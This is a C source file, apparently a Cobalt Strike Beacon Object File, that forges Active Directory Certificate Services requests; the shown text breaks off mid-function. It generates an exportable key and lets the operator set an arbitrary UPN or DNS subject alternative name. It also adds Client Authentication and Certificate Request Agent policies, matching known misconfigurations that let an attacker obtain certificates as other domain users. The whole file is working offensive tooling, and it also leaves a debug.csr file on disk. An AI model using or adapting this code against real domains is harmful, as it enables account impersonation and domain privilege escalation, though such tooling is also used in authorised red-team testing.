#include <windows.h>
#include <stdio.h>
#include <oleauto.h>
#include <wchar.h>
#include <stdlib.h>
#include <combaseapi.h>
#include "beacon.h"
#include "bofdefs.h"
#include "adcs_request.h"

typedef BSTR WINAPI (*SysAllocString_t)(const OLECHAR *);
typedef UINT WINAPI (*SysStringLen_t)(BSTR);
typedef void WINAPI (*SysFreeString_t)(BSTR);

//#define OLEAUT32$SysAllocString ((SysAllocString_t)DynamicLoad("OLEAUT32$SysAllocString"))
//#define OLEAUT32$SysStringLen ((SysStringLen_t)DynamicLoad("OLEAUT32$SysStringLen"))
//#define OLEAUT32$SysFreeString ((SysFreeString_t)DynamicLoad("OLEAUT32$SysFreeString"))

typedef HRESULT WINAPI (*CoInitializeEx_t)(LPVOID pvReserved, DWORD dwCoInit);
typedef HRESULT WINAPI (*CoUninitialize_t)(void);

//#define OLE32$CoInitializeEx ((CoInitializeEx_t)DynamicLoad("OLE32$CoInitializeEx"))
//#define OLE32$CoUninitialize ((CoUninitialize_t)DynamicLoad("OLE32$CoUninitialize"))


#define IsNullOrEmptyW(str) \
(( NULL == str ) || ( 0 == MSVCRT$wcslen(str) ))
#define CHECK_RETURN_NULL( function, return_value, result) \
	if (NULL == return_value) \
	{ \
		result = E_INVALIDARG; \
		BeaconPrintf(CALLBACK_ERROR, "%s failed\n", function); \
		goto fail; \
	}
#define BETTER_CHECK_RETURN_FAIL(x) { \
	HRESULT hr = x; \
	if(FAILED(hr)) \
	{ \
		BeaconPrintf(CALLBACK_ERROR, "%s failed: 0x%08lx\n", #x, hr); \
		goto fail; \
	} \
}

#define CHECK_RETURN_FAIL( function, result ) \
	if (FAILED(result)) \
	{ \
		BeaconPrintf(CALLBACK_ERROR, "%s failed: 0x%08lx\n", function, result); \
		goto fail; \
	}
#define CHECK_RETURN_FALSE( function, result ) \
	if (FALSE == (BOOL)result) \
	{ \
		result = KERNEL32$GetLastError(); \
		BeaconPrintf(CALLBACK_ERROR, "%s failed: %lu\n", function, (DWORD)result); \
		result = HRESULT_FROM_WIN32(result); \
		goto fail; \
	}	
#define SAFE_RELEASE( interfacepointer )	\
	if ( (interfacepointer) != NULL )	\
	{	\
		(interfacepointer)->lpVtbl->Release(interfacepointer);	\
		(interfacepointer) = NULL;	\
	}
#define SAFE_SYS_FREE( string_ptr )	\
	if ( (string_ptr) != NULL )	\
	{	\
		OLEAUT32$SysFreeString(string_ptr);	\
		(string_ptr) = NULL;	\
	}	
#define SAFE_LOCAL_FREE( local_ptr ) \
	if (local_ptr) \
	{ \
		KERNEL32$LocalFree(local_ptr); \
		local_ptr = NULL; \
	}
#define SAFE_INT_FREE( int_ptr ) \
	if (int_ptr) \
	{ \
		intFree(int_ptr); \
		int_ptr = NULL; \
	}		



#define PRIVATE_KEY_LENGTH 2048
#define CERT_REQUEST_TIMEOUT 3000
#define CERT_REQUEST_RETRIES 3


HRESULT _adcs_request_CreatePrivateKey(BOOL bMachine, IX509PrivateKey ** lppPrivateKey)
{
	HRESULT	hr = S_OK;
	ICspInformations * pCspInformations = NULL;

	CLSID CLSID_CCspInformations = { 0x884e2008, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
	IID IID_ICspInformations = { 0x728ab308, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };

	CLSID CLSID_CX509PrivateKey = { 0x884e200c, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
	IID IID_IX509PrivateKey = { 0x728ab30c, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
	SAFE_RELEASE(*lppPrivateKey);
	hr = OLE32$CoCreateInstance(&CLSID_CX509PrivateKey, NULL, CLSCTX_INPROC_SERVER, &IID_IX509PrivateKey, (LPVOID *)(lppPrivateKey));
	CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CCspInformations)", hr);


	// Create an instance of the CLSID_CCspInformations class with the IID_ICspInformations interface
	SAFE_RELEASE(pCspInformations);
	hr = OLE32$CoCreateInstance(&CLSID_CCspInformations, NULL, CLSCTX_INPROC_SERVER, &IID_ICspInformations, (LPVOID *)&(pCspInformations));
	CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CCspInformations)", hr);

	hr = pCspInformations->lpVtbl->AddAvailableCsps(pCspInformations);
	CHECK_RETURN_FAIL("pCspInformations->lpVtbl->AddAvailableCsps()", hr);
	hr = (*lppPrivateKey)->lpVtbl->put_Length((*lppPrivateKey), PRIVATE_KEY_LENGTH);
	CHECK_RETURN_FAIL("(*lppPrivateKey)->lpVtbl->put_Length()", hr);

	hr = (*lppPrivateKey)->lpVtbl->put_KeySpec((*lppPrivateKey), XCN_AT_SIGNATURE);
	CHECK_RETURN_FAIL("(*lppPrivateKey)->lpVtbl->put_KeySpec()", hr);

	hr = (*lppPrivateKey)->lpVtbl->put_KeyUsage((*lppPrivateKey), XCN_NCRYPT_ALLOW_ALL_USAGES);
	CHECK_RETURN_FAIL("(*lppPrivateKey)->lpVtbl->put_KeyUsage()", hr);

	hr = (*lppPrivateKey)->lpVtbl->put_MachineContext((*lppPrivateKey), (bMachine?VARIANT_TRUE:VARIANT_FALSE));
	CHECK_RETURN_FAIL("(*lppPrivateKey)->lpVtbl->put_MachineContext()", hr);

	hr = (*lppPrivateKey)->lpVtbl->put_ExportPolicy((*lppPrivateKey), XCN_NCRYPT_ALLOW_EXPORT_FLAG);
	CHECK_RETURN_FAIL("(*lppPrivateKey)->lpVtbl->put_ExportPolicy()", hr);

	hr = (*lppPrivateKey)->lpVtbl->put_CspInformations((*lppPrivateKey), pCspInformations);
	CHECK_RETURN_FAIL("(*lppPrivateKey)->lpVtbl->put_ExportPolicy()", hr);

	hr = (*lppPrivateKey)->lpVtbl->Create((*lppPrivateKey));
	CHECK_RETURN_FAIL("(*lppPrivateKey)->lpVtbl->Create()", hr);

	hr = S_OK;

fail:

	SAFE_RELEASE(pCspInformations);

	return hr;
} // end _adcs_request_CreatePrivateKey


HRESULT _adcs_request_CreateCertRequest(BOOL bMachine, IX509PrivateKey * pPrivateKey, BSTR bstrTemplate, BSTR bstrSubject, BSTR bstrAltName, BSTR bstrAltUrl, IX509CertificateRequestPkcs10V3 ** lppCertificateRequestPkcs10V3, BOOL addAppPolicy, BOOL dns)
{
	HRESULT	hr = S_OK;
	IX500DistinguishedName * pDistinguishedName = NULL;
	IAlternativeName * pAlternativeName = NULL;
	IAlternativeNames * pAlternativeNames = NULL;
	IX509ExtensionAlternativeNames * pExtensionAlternativeNames = NULL;
	IX509Extension * pExtension = NULL;
	IX509Extensions * pExtensions = NULL;
	IX509NameValuePair * pAltNameValuePair = NULL;
	IX509NameValuePairs * pNameValuePairs = NULL;
	IX509ExtensionTemplateName * pTemplateName = NULL;
	IX509ExtensionMSApplicationPolicies * pMSAppPolicies = NULL;
	ICertificatePolicies * certPolicies = NULL;
	ICertificatePolicy * certPolicy = NULL;
	ICertificatePolicy * certPolicyReqAgent = NULL;
	IObjectId * objectId_POLICIES = NULL;
	IObjectId * objectId_ALLOW_CLIENT = NULL;
	IObjectId * objectid_CERTAGENT = NULL;
	BSTR bstrAltNameValuePairName = NULL;
	BSTR bstrAltNameValuePairValue = NULL;
	BSTR OID_APP_CERT_POLICY_ALLOW_CLIENT = NULL;
	WCHAR swzAltNamePairValue[MAX_PATH];
	LONG index = 0;
	
	BSTR OID_APP_CERT_POLICIES = OLEAUT32$SysAllocString(L"1.3.6.1.4.1.311.21.10");
	BSTR OID_APP_CERTAGENT = OLEAUT32$SysAllocString(L"1.3.6.1.4.1.311.20.2.1");
	
	CLSID CLSID_CX509CertificateRequestPkcs10 = { 0x884e2042, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
	IID IID_IX509CertificateRequestPkcs10V3 = { 0x54EA9942, 0x3D66, 0x4530, {0XB7, 0X6E, 0x7C, 0x91, 0x70, 0xD3, 0xEC, 0x52} };

	CLSID CLSID_CX500DistinguishedName = { 0x884e2003, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
	IID IID_IX500DistinguishedName = { 0x728ab303, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };

	CLSID CLSID_CAlternativeName = { 0x884e2013, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
	IID IID_IAlternativeName = { 0x728ab313, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };

	CLSID CLSID_CAlternativeNames = { 0x884e2014, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
	IID IID_IAlternativeNames = { 0x728ab314, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };

	CLSID CLSID_CX509ExtensionAlternativeNames = { 0x884e2015, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
	IID IID_IX509ExtensionAlternativeNames = { 0x728ab315, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };

	IID IID_IX509Extension = { 0x728ab30d, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };

	CLSID CLSID_CX509NameValuePair = { 0x884e203f, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
	IID IID_IX509NameValuePair = { 0x728ab33f, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };

	CLSID  CLSID_CX509ExtensionMSApplicationPolicies = {0x884e2021,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
	IID IID_IX509ExtensionMSApplicationPolicies = {0x728ab321,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};

	CLSID CLSID_CCertificatePolicy = {0x884e201e,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
	IID IID_ICertificatePolicy = {0x728ab31e,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};

	CLSID CLSID_CCertificatePolicies = {0x884e201f,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
	IID IID_ICertificatePolicies = {0x728ab31f,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};

	CLSID CLSID_CObjectId = {0x884e2000,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
	IID IID_IObjectId = {0x728ab300,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};

	CLSID CLSID_EKU = {0x884e2010,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
	IID IID_EKU = {0x728ab310,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};

	CLSID CLSID_TemplateName = {0x884e2011,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
	IID IID_TemplateName = {0x728ab311,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
	
	// Create an instance of the CX509CertificateRequestPkcs10 class with the IX509CertificateRequestPkcs10V2 interface
	SAFE_RELEASE((*lppCertificateRequestPkcs10V3));
	hr = OLE32$CoCreateInstance(&CLSID_CX509CertificateRequestPkcs10, NULL, CLSCTX_INPROC_SERVER, &IID_IX509CertificateRequestPkcs10V3, (LPVOID *)lppCertificateRequestPkcs10V3);
	CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CX509CertificateRequestPkcs10)", hr);

	// Initializes the certificate request by using the template name
	hr = (*lppCertificateRequestPkcs10V3)->lpVtbl->InitializeFromPrivateKey((*lppCertificateRequestPkcs10V3), (bMachine?ContextMachine:ContextUser), pPrivateKey, bstrTemplate);
	CHECK_RETURN_FAIL("(*lppCertificateRequestPkcs10V3)->lpVtbl->InitializeFromTemplateName()", hr);

	// Create an instance of the CX500DistinguishedName class with the IX500DistinguishedName interface
	SAFE_RELEASE(pDistinguishedName);
	hr = OLE32$CoCreateInstance(&CLSID_CX500DistinguishedName, NULL, CLSCTX_INPROC_SERVER, &IID_IX500DistinguishedName, (LPVOID *)&(pDistinguishedName));
	CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CX500DistinguishedName)", hr);

	hr = OLE32$CoCreateInstance(&CLSID_CObjectId, NULL, CLSCTX_INPROC_SERVER, &IID_IObjectId, (LPVOID *) &objectId_POLICIES);
	CHECK_RETURN_FAIL("CoCreateInstance(CLSID_OBJECTID)", hr);

		hr = OLE32$CoCreateInstance(&CLSID_CObjectId, NULL, CLSCTX_INPROC_SERVER, &IID_IObjectId, (LPVOID *) &objectId_ALLOW_CLIENT);
	CHECK_RETURN_FAIL("CoCreateInstance(CLSID_OBJECTID)", hr);

	BETTER_CHECK_RETURN_FAIL(OLE32$CoCreateInstance(&CLSID_CObjectId, NULL, CLSCTX_INPROC_SERVER, &IID_IObjectId, (LPVOID *) &objectid_CERTAGENT));
	

	// Encode the subject name
	hr = pDistinguishedName->lpVtbl->Encode(pDistinguishedName, bstrSubject, XCN_CERT_NAME_STR_NONE);
	if (FAILED(hr))
	{
		hr = pDistinguishedName->lpVtbl->Encode(pDistinguishedName, bstrSubject, XCN_CERT_NAME_STR_SEMICOLON_FLAG);
		CHECK_RETURN_FAIL("pDistinguishedName->lpVtbl->Encode(XCN_CERT_NAME_STR_SEMICOLON_FLAG)", hr);
	}
	
	// Set the subject
	hr = (*lppCertificateRequestPkcs10V3)->lpVtbl->put_Subject((*lppCertificateRequestPkcs10V3), pDistinguishedName);
	CHECK_RETURN_FAIL("(*lppCertificateRequestPkcs10V3)->lpVtbl->put_Subject()", hr);

	// Set the alt name
	if ( !IsNullOrEmptyW(bstrAltName) )
	{		
		// Format 1 - required for the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT scenario
		// Create an instance of the CAlternativeNames class with the IAlternativeNames interface
		SAFE_RELEASE(pAlternativeNames);
		hr = OLE32$CoCreateInstance(&CLSID_CAlternativeNames, NULL, CLSCTX_INPROC_SERVER, &IID_IAlternativeNames, (LPVOID *)&(pAlternativeNames));
		CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CAlternativeNames)", hr);
		// Create an instance of the CX509ExtensionAlternativeNames class with the IX509ExtensionAlternativeNames interface
		SAFE_RELEASE(pExtensionAlternativeNames);
		hr = OLE32$CoCreateInstance(&CLSID_CX509ExtensionAlternativeNames, NULL, CLSCTX_INPROC_SERVER, &IID_IX509ExtensionAlternativeNames, (LPVOID *)&(pExtensionAlternativeNames));
		CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CX509ExtensionAlternativeNames)", hr);

		// Add UPN or DNS SAN
		// Create an instance of the CAlternativeName class with the IAlternativeName interface
		SAFE_RELEASE(pAlternativeName);
		hr = OLE32$CoCreateInstance(&CLSID_CAlternativeName, NULL, CLSCTX_INPROC_SERVER, &IID_IAlternativeName, (LPVOID *)&(pAlternativeName));
		CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CAlternativeName)", hr);
		// Initialize the AlternativeName
		hr = pAlternativeName->lpVtbl->InitializeFromString(pAlternativeName, (dns) ? XCN_CERT_ALT_NAME_DNS_NAME : XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME, bstrAltName);
		CHECK_RETURN_FAIL("pAlternativeName->lpVtbl->InitializeFromString()", hr);
		// Add the AlternativeName to the collection of AlternativeNames
		hr = pAlternativeNames->lpVtbl->Add(pAlternativeNames, pAlternativeName);
		CHECK_RETURN_FAIL("pAlternativeNames->lpVtbl->Add()", hr);

		if ( !IsNullOrEmptyW(bstrAltUrl) )
		{
			// Add URL SAN
			// Create an instance of the CAlternativeName class with the IAlternativeName interface
			SAFE_RELEASE(pAlternativeName);
			hr = OLE32$CoCreateInstance(&CLSID_CAlternativeName, NULL, CLSCTX_INPROC_SERVER, &IID_IAlternativeName, (LPVOID *)&(pAlternativeName));
			CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CAlternativeName)", hr);
			// Initialize the AlternativeName
			hr = pAlternativeName->lpVtbl->InitializeFromString(pAlternativeName, XCN_CERT_ALT_NAME_URL, bstrAltUrl);
			CHECK_RETURN_FAIL("pAlternativeName->lpVtbl->InitializeFromString()", hr);
			// Add the AlternativeName to the collection of AlternativeNames
			hr = pAlternativeNames->lpVtbl->Add(pAlternativeNames, pAlternativeName);
			CHECK_RETURN_FAIL("pAlternativeNames->lpVtbl->Add()", hr);
		}

		// Initialize the X509ExtensionAlternativeNames collection from the AlternativeNames collection
		hr = pExtensionAlternativeNames->lpVtbl->InitializeEncode(pExtensionAlternativeNames, pAlternativeNames);
		CHECK_RETURN_FAIL("pExtensionAlternativeNames->lpVtbl->InitializeEncode()", hr);
		// Get the X509Extension interface of the X509ExtensionAlternativeNames
		SAFE_RELEASE(pExtension);
		hr = pExtensionAlternativeNames->lpVtbl->QueryInterface( pExtensionAlternativeNames, &IID_IX509Extension, (VOID **)&pExtension);
		CHECK_RETURN_FAIL("pExtensionAlternativeNames->lpVtbl->QueryInterface()", hr);
		// Get the collection of extensions included in the certificate request
		SAFE_RELEASE(pExtensions);
    	hr = (*lppCertificateRequestPkcs10V3)->lpVtbl->get_X509Extensions((*lppCertificateRequestPkcs10V3), &pExtensions);
    	CHECK_RETURN_FAIL("(*lppCertificateRequestPkcs10V3)->lpVtbl->get_X509Extensions()", hr);
		// Add the X509ExtensionAlternativeNames collection to the certificate request's collection of extensions
		hr = pExtensions->lpVtbl->Add(pExtensions, pExtension);
		CHECK_RETURN_FAIL("pExtensions->lpVtbl->Add()", hr);

		// Format 2 - required for the EDITF_ATTRIBUTESUBJECTALTNAME2 scenario
		// Create an instance of the CLSID_CX509NameValuePair class with the IID_IX509NameValuePair interface
		SAFE_RELEASE(pAltNameValuePair);
		hr = OLE32$CoCreateInstance(&CLSID_CX509NameValuePair, NULL, CLSCTX_INPROC_SERVER, &IID_IX509NameValuePair, (LPVOID *)&(pAltNameValuePair));
		CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CX509NameValuePair)", hr);
		// Create the AltNamePair Name
		SAFE_SYS_FREE(bstrAltNameValuePairName);
		bstrAltNameValuePairName = OLEAUT32$SysAllocString(L"SAN");
		// Create the AltNamePair Value
		MSVCRT$memset(swzAltNamePairValue,0,MAX_PATH*sizeof(WCHAR));
		if ( !IsNullOrEmptyW(bstrAltUrl) )
		{
			MSVCRT$_swprintf(swzAltNamePairValue, L"%s=%s&url=%s",(dns) ? L"dns" : L"upn", bstrAltName, bstrAltUrl);
		}
		else
		{
			MSVCRT$_swprintf(swzAltNamePairValue, L"%s=%s",(dns) ? L"dns" : L"upn", bstrAltName);
		}
		SAFE_SYS_FREE(bstrAltNameValuePairValue);
		bstrAltNameValuePairValue = OLEAUT32$SysAllocString(swzAltNamePairValue);
		// Initialize the AltNamePair
        pAltNameValuePair->lpVtbl->Initialize(pAltNameValuePair, bstrAltNameValuePairName, bstrAltNameValuePairValue);
		// Get the collection of NameValuePairs included in the certificate request
		SAFE_RELEASE(pNameValuePairs);
    	hr = (*lppCertificateRequestPkcs10V3)->lpVtbl->get_NameValuePairs((*lppCertificateRequestPkcs10V3), &pNameValuePairs);
    	CHECK_RETURN_FAIL("(*lppCertificateRequestPkcs10V3)->lpVtbl->get_NameValuePairs()", hr);
		// Add the X509NameValuePair to the certificate request's collection of name value pairs
		hr = pNameValuePairs->lpVtbl->Add(pNameValuePairs, pAltNameValuePair);
		CHECK_RETURN_FAIL("pNameValuePairs->lpVtbl->Add()", hr);
	}
	if(addAppPolicy)
	{
		hr = objectId_POLICIES->lpVtbl->InitializeFromValue(objectId_POLICIES, OID_APP_CERT_POLICIES);
		CHECK_RETURN_FAIL(" objectId_ALLOW_CLIENT->lpVtbl->InitializeFromValu", hr);
		//First Check if the base extension is already there
		SAFE_RELEASE(pExtensions);
    	hr = (*lppCertificateRequestPkcs10V3)->lpVtbl->get_X509Extensions((*lppCertificateRequestPkcs10V3), &pExtensions);
    	CHECK_RETURN_FAIL("(*lppCertificateRequestPkcs10V3)->lpVtbl->get_X509Extensions()", hr);
		hr = pExtensions->lpVtbl->get_IndexByObjectId(pExtensions, objectId_POLICIES, &index);
		if(hr == S_OK)
		{
			pExtensions->lpVtbl->get_ItemByIndex(pExtensions, index, (IX509Extension**)&pMSAppPolicies);
			CHECK_RETURN_FAIL("pExtensions->lpVtbl->get_ItemByIndex", hr);
			internal_printf("Found App Policy at index %d, removing it\n", index);
			hr = pExtensions->lpVtbl->Remove(pExtensions, index);
			CHECK_RETURN_FAIL("pExtensions->lpVtbl->Remove", hr);
		}
		internal_printf("Now Creating App policy\n");
		hr = OLE32$CoCreateInstance(&CLSID_CX509ExtensionMSApplicationPolicies, NULL, CLSCTX_INPROC_SERVER, &IID_IX509ExtensionMSApplicationPolicies, (LPVOID *)&pMSAppPolicies);
		CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CX509ExtensionMSApplicationPolicies)", hr);
		hr = OLE32$CoCreateInstance(&CLSID_CCertificatePolicies, NULL, CLSCTX_INPROC_SERVER, &IID_ICertificatePolicies, (LPVOID*)&certPolicies);
		CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CCertificatePolicies)", hr);
		hr = OLE32$CoCreateInstance(&CLSID_CCertificatePolicy, NULL, CLSCTX_INPROC_SERVER, &IID_ICertificatePolicy, (LPVOID*) &certPolicy);
		CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CCertificatePolicy)", hr);
		OID_APP_CERT_POLICY_ALLOW_CLIENT = OLEAUT32$SysAllocString(L"1.3.6.1.5.5.7.3.2");
		hr = objectId_ALLOW_CLIENT->lpVtbl->InitializeFromValue(objectId_ALLOW_CLIENT, OID_APP_CERT_POLICY_ALLOW_CLIENT);
		CHECK_RETURN_FAIL(" objectId_ALLOW_CLIENT->lpVtbl->InitializeFromValu", hr);
		SAFE_SYS_FREE(OID_APP_CERT_POLICY_ALLOW_CLIENT);
		hr = certPolicy->lpVtbl->Initialize(certPolicy, objectId_ALLOW_CLIENT);
		CHECK_RETURN_FAIL(" certPolicy->lpVtbl->Initialize", hr);
		hr = certPolicies->lpVtbl->Add(certPolicies, certPolicy);
		CHECK_RETURN_FAIL(" certPolicies->lpVtbl->Add", hr);
		//Cert Request
		hr = OLE32$CoCreateInstance(&CLSID_CCertificatePolicy, NULL, CLSCTX_INPROC_SERVER, &IID_ICertificatePolicy, (LPVOID*) &certPolicyReqAgent);
		CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CCertificatePolicy)", hr);
		hr = objectid_CERTAGENT->lpVtbl->InitializeFromValue(objectid_CERTAGENT, OID_APP_CERTAGENT);
		CHECK_RETURN_FAIL(" objectid_SMARTCARD->lpVtbl->InitializeFromValu", hr);
		SAFE_SYS_FREE(OID_APP_CERTAGENT);
		hr = certPolicyReqAgent->lpVtbl->Initialize(certPolicyReqAgent, objectid_CERTAGENT);
		CHECK_RETURN_FAIL(" certPolicy->lpVtbl->Initialize", hr);
		hr = certPolicies->lpVtbl->Add(certPolicies, certPolicyReqAgent);
		CHECK_RETURN_FAIL(" certPolicies->lpVtbl->Add", hr);
		hr = pMSAppPolicies->lpVtbl->InitializeEncode(pMSAppPolicies, certPolicies);
		CHECK_RETURN_FAIL("pMSAppPolicies->lpVtbl->InitializeEncode", hr);
		SAFE_RELEASE(pExtension);
		hr = pMSAppPolicies->lpVtbl->QueryInterface( pMSAppPolicies, &IID_IX509Extension, (VOID **)&pExtension);
		CHECK_RETURN_FAIL("pExtensionAlternativeNames->lpVtbl->QueryInterface()", hr);
		hr = pExtensions->lpVtbl->Add(pExtensions, pExtension);
		CHECK_RETURN_FAIL("pExtensions->lpVtbl->Add()", hr);
	}

	hr = S_OK;

fail:

	//saferelease all the objects
	SAFE_RELEASE(pNameValuePairs);
	SAFE_RELEASE(pAltNameValuePair);
	SAFE_SYS_FREE(bstrAltNameValuePairValue);
	SAFE_SYS_FREE(bstrAltNameValuePairName);
	SAFE_SYS_FREE(OID_APP_CERT_POLICY_ALLOW_CLIENT);
	SAFE_SYS_FREE(OID_APP_CERT_POLICIES);
	SAFE_SYS_FREE(OID_APP_CERTAGENT);
	SAFE_RELEASE(objectId_POLICIES);
	SAFE_RELEASE(objectId_ALLOW_CLIENT);
	SAFE_RELEASE(pAltNameValuePair);
	SAFE_RELEASE(pExtensions);
	SAFE_RELEASE(pExtension);
	SAFE_RELEASE(pMSAppPolicies);
	SAFE_RELEASE(certPolicies);
	SAFE_RELEASE(certPolicy);
	SAFE_RELEASE(certPolicyReqAgent);
	SAFE_RELEASE(pExtensionAlternativeNames);
	SAFE_RELEASE(pAlternativeNames);
	SAFE_RELEASE(pAlternativeName);
	SAFE_RELEASE(pDistinguishedName);
	

	return hr;
} // end _adcs_request_CreateCertRequest


HRESULT _adcs_request_CreateEnrollment(IX509CertificateRequestPkcs10V3 * pCertificateRequestPkcs10V3, IX509Enrollment ** lppEnrollment)
{
	HRESULT	hr = S_OK;
	
	IX509CertificateRequest * pCertificateRequest = NULL;

	CLSID CLSID_CX509Enrollment = { 0x884e2046, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
	IID IID_IX509Enrollment = { 0x728ab346, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };

	IID IID_IX509CertificateRequest = { 0x728ab341, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
	HANDLE hFile = NULL;
	BSTR value;
	DWORD len = 0;
	// Create an instance of the CX509Enrollment class with the IX509Enrollment interface
	SAFE_RELEASE((*lppEnrollment));
	hr = OLE32$CoCreateInstance(&CLSID_CX509Enrollment, NULL, CLSCTX_INPROC_SERVER, &IID_IX509Enrollment, (LPVOID *)lppEnrollment);
	CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CX509Enrollment)", hr);
	
	SAFE_RELEASE(pCertificateRequest);
	hr = pCertificateRequestPkcs10V3->lpVtbl->QueryInterface(pCertificateRequestPkcs10V3, &IID_IX509CertificateRequest, (VOID **)&(pCertificateRequest));
	CHECK_RETURN_FAIL("pCertificateRequestPkcs10V3->lpVtbl->QueryInterface()", hr);

	// Initialize the enrollment object with the certificate request
	hr = (*lppEnrollment)->lpVtbl->InitializeFromRequest((*lppEnrollment), pCertificateRequest);
	CHECK_RETURN_FAIL("(*lppEnrollment)->lpVtbl->InitializeFromRequest()", hr);
	
	pCertificateRequestPkcs10V3->lpVtbl->Encode(pCertificateRequestPkcs10V3);
	pCertificateRequestPkcs10V3->lpVtbl->get_RawData(pCertificateRequestPkcs10V3, XCN_CRYPT_STRING_BASE64REQUESTHEADER, &value);
	hFile = KERNEL32$CreateFileA("debug.csr", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	len = OLEAUT32$SysStringLen(value);
	KERNEL32$WriteFile(hFile, value, len *2, NULL , NULL);
	KERNEL32$CloseHandle(hFile);
	hr = S_OK;

fail:

	SAFE_RELEASE(pCertificateRequest);

	return hr;
} 


HRESULT _adcs_request_SubmitEnrollment(IX509Enrollment * pEnrollment, BSTR bstrCA, BSTR * lpbstrCertificate)
{
	HRESULT	hr = S_OK;
	BSTR bstrEnrollmentRequest = NULL;
	ICertRequest2* pCertRequest2 = NULL;
	LONG pDisposition = 0;
	BSTR bstrDispositionMessage = NULL;
	LONG pRequestId = 0;

	CLSID CLSID_CCertRequest = { 0x98aff3f0, 0x5524, 0x11d0, {0X88, 0X12, 0x00, 0xa0, 0xc9, 0x03, 0xb8, 0x3c} };
	IID	IID_ICertRequest2 = { 0xA4772988, 0x4A85, 0x4FA9, {0x82, 0x4E, 0xB5, 0xCF, 0x5C, 0x16, 0x40, 0x5A} };

	// Create the enrollment request
	SAFE_SYS_FREE(bstrEnrollmentRequest);
	hr = pEnrollment->lpVtbl->CreateRequest(pEnrollment, XCN_CRYPT_STRING_BASE64, &bstrEnrollmentRequest);
	CHECK_RETURN_FAIL("pEnrollment->lpVtbl->CreateRequest()", hr);

	// Create an instance of the CCertRequest class with the ICertRequest2 interface
	SAFE_RELEASE(pCertRequest2);
	hr = OLE32$CoCreateInstance(&CLSID_CCertRequest, NULL, CLSCTX_INPROC_SERVER, &IID_ICertRequest2, (LPVOID *)&(pCertRequest2));
	CHECK_RETURN_FAIL("CoCreateInstance(CLSID_CX509CertificateRequestPkcs10)", hr);

	// Submit the cert request message to the CA
	hr = pCertRequest2->lpVtbl->Submit(pCertRequest2, CR_IN_BASE64 | CR_IN_FORMATANY, bstrEnrollmentRequest, NULL, bstrCA, &pDisposition);   
	CHECK_RETURN_FAIL("pCertRequest2->lpVtbl->Submit()", hr);

	// Get the request ID
	hr = pCertRequest2->lpVtbl->GetRequestId(pCertRequest2, &pRequestId);   
